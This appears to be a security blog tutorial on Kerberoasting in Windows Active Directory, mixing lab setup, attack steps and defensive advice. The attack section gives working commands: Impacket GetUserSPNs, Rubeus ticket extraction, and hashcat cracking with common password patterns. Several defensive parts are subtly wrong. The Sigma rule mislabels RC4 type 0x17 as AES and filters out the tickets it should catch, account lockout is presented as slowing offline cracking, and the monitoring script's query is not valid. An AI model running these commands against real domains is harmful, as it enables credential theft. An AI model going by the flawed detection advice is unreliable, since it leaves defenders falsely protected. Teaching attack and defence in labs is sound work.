---
author: ["Anass"]
title: "Kerberoasting 101: Hands-On Attack, Detection & Mitigation in Windows Domains"
date: "2026-01-15"
description: "A practical guide to understanding, executing, and detecting Kerberoasting attacks in Active Directory environments."
tags: ["Kerberoasting", "Active Directory", "Pentesting", "Windows Security", "Red Team"]
categories: ["Security", "Red Team", "Hands-On"]
ShowToc: true
---

Kerberoasting is one of the most effective post-exploitation techniques used by attackers and red teamers to escalate privileges in Windows domains. In this article, we'll dive deep into how the attack works, set up a lab environment, execute the attack step-by-step, and most importantly—learn how to detect and mitigate it.

### Understanding Kerberoasting

Kerberoasting exploits the Kerberos authentication protocol used in Active Directory. Here's the simplified flow:

1. A user requests a Ticket-Granting Ticket (TGT) from the Key Distribution Center (KDC)
2. The user presents their TGT to request a Ticket-Granting Service (TGS) for a specific service
3. The TGS is encrypted with the service account's password hash

The attacker's goal: Request TGS tickets for service accounts, crack the encrypted portion offline, and recover the plaintext password.

### Why It Works

- Service accounts often have privileged access (Domain Admin, SQL Server, etc.)
- Passwords are rarely rotated and tend to be weak
- TGS tickets are encrypted with NTLM hashes, which are crackable
- The attack is stealthy and blends in with normal traffic

---

### Lab Environment Setup

For this hands-on demonstration, we'll use:

- **Attacker machine**: Kali Linux
- **Target**: Windows Server 2019 with Active Directory
- **Tools**: Impacket, Rubeus, Hashcat

#### Setting Up Vulnerable Service Accounts

On your Windows domain controller, create a vulnerable service account:

```powershell
# Create a service account with a weak password
New-ADUser -Name "ServiceAccount" -SamAccountName "ServiceAccount" `
           -UserPrincipalName "ServiceAccount@DOMAIN.LOCAL" `
           -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
           -Enabled $true

# Set SPN (Service Principal Name) to make it Kerberoasteable
setspn -A HTTP/webservice.domain.local ServiceAccount

# Grant the account Domain Admin privileges (for demonstration)
Add-ADGroupMember -Identity "Domain Admins" -Members "ServiceAccount"
```

#### Configure Attacker Machine

```bash
# Install required tools on Kali
git clone https://github.com/fortra/impacket.git
cd impacket && pip3 install .
git clone https://github.com/hashcat/hashcat.git
```

---

### Executing the Attack

#### Step 1: Reconnaissance

First, enumerate all Kerberoasteable accounts using Impacket's GetUserSPNs:

```bash
# Using credentials obtained from initial access
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
    -request \
    -dc-ip 192.168.1.10 \
    DOMAIN.LOCAL/username:Password123
```

This command requests TGS tickets for all accounts with SPNs set.

#### Step 2: Extracting TGS Tickets

Alternatively, using Rubeus on a Windows machine:

```powershell
# Request TGS for specific account
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Or for all accounts
.\Rubeus.exe kerberoast /all /outfile:all_hashes.txt
```

The output will look like:

```
$krb5tgs$23$*ServiceAccount$DOMAIN.LOCAL$HTTP/webservice.domain.local@DOMAIN.LOCAL*[redacted hash]
```

#### Step 3: Cracking the Hash

Now the fun part—cracking the TGS hash with Hashcat:

```bash
# Mode 13100 is for Kerberos 5 TGS-REP etype 23
hashcat -m 13100 hashes.txt wordlist.txt --rules best64.rule
```

Common passwords to try:
- Season + Year: `Summer2024!`, `Winter2024!`
- Default patterns: `Password123!`, `Service123!`
- Company name + Year: `Company2024!`

---

### Detection Strategies

#### Windows Event Log Monitoring

**Event ID 4769**: A Kerberos service ticket was requested

Look for these anomalies:

```powershell
# Search for unusual ticket requests
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} -MaxEvents 1000 |
    Where-Object { $_.Message -notmatch "krbtgt" } |
    Group-Object TargetUserName |
    Sort-Object Count -Descending
```

**Indicators of Kerberoasting:**
- Same account requesting many TGS tickets in short time span
- Requests from unusual source IPs
- Service accounts with privileged group membership requesting tickets

#### Sigma Rule for Detection

```yaml
title: Kerberoasting Attack Detected
id: 1a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d
status: experimental
description: Detects potential Kerberoasting activity
author: Your Name
date: 2025/01/15

logsource:
    product: windows
    service: security

detection:
    selection:
        EventID: 4769
        TargetUserName: '*$@*'  # Machine accounts usually
    filter:
        TicketEncryptionType: 0x17  # AES enabled accounts
    condition: selection and not filter

fields:
    - TargetUserName
    - IpAddress
    - TicketEncryptionType

level: high
```

#### PowerShell Script for Continuous Monitoring

```powershell
# Monitor for Kerberoasting in real-time
$query = "*[System[(EventID=4769)]]"
$results = @()

Register-WmiEvent -Query $query -SourceIdentifier "Kerberoasting" -Action {
    $event = $EventArgs.NewEvent
    $user = $event.TargetUserName
    $ip = $event.IpAddress
    
    # Alert if account is privileged
    $groups = Get-ADUser $user -Properties MemberOf | Select-Object -ExpandProperty MemberOf
    if ($groups -match "Domain Admin|Enterprise Admin") {
        Write-Host "[ALERT] Privileged account Kerberoast: $user from $ip" -ForegroundColor Red
    }
}
```

---

### Mitigation Strategies

#### 1. Use Strong Passwords for Service Accounts

```powershell
# Generate and set a strong password
$password = -join ((65..90) + (97..122) + (48..57) + (33..47) | Get-Random -Count 20 | ForEach-Object {[char]$_})
Set-ADAccountPassword -Identity "ServiceAccount" -NewPassword (ConvertTo-SecureString $password -AsPlainText -Force)
```

#### 2. Enable AES Encryption

```powershell
# Use AES keys instead of RC4
Set-ADUser -Identity "ServiceAccount" -Add @{"msDS-SupportedEncryptionTypes"="24"}
```

#### 3. Implement Least Privilege

- Avoid granting Domain Admin to service accounts
- Use separate accounts for services and administration
- Regularly audit group memberships

#### 4. Reduce Ticket Lifetime

```powershell
# In Group Policy
# Computer Configuration > Administrative Templates > KDC > Enforce minimum logon security
```

#### 5. Account Lockout Policies

Even if attackers try to crack passwords, proper lockout policies can slow them down:

```powershell
# Set strict lockout policy
Set-ADDefaultDomainPasswordPolicy -Identity "DOMAIN.LOCAL" `
    -LockoutDuration "00:30:00" `
    -LockoutObservationWindow "00:30:00" `
    -MaxBadPasswordsAllowed 5
```

---

### Conclusion

Kerberoasting remains a highly effective attack because it exploits fundamental design choices in Kerberos and human habits (weak passwords). The attack is silent, requires no code execution on the DC, and can yield Domain Admin credentials.

The key defense is a layered approach: strong passwords, least privilege, monitoring, and regular audits. As defenders, understanding the attack is the first step to building effective detection rules.

---

**Lab Challenge**: Set up your own lab and try to:
1. Create a vulnerable service account
2. Execute the Kerberoasting attack
3. Write a detection rule that catches your own attack
4. Implement one mitigation and verify it works

---

**Sources:**

1. [Harmj0y's Blog - Kerberoasting](https://harmj0y.medium.com/kerberoasting)
2. [Impacket Documentation](https://github.com/fortra/impacket)
3. [Hashcat Modes - Kerberos](https://hashcat.net/wiki/doku.php?id=example_hashes)
4. [MITRE ATT&CK - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
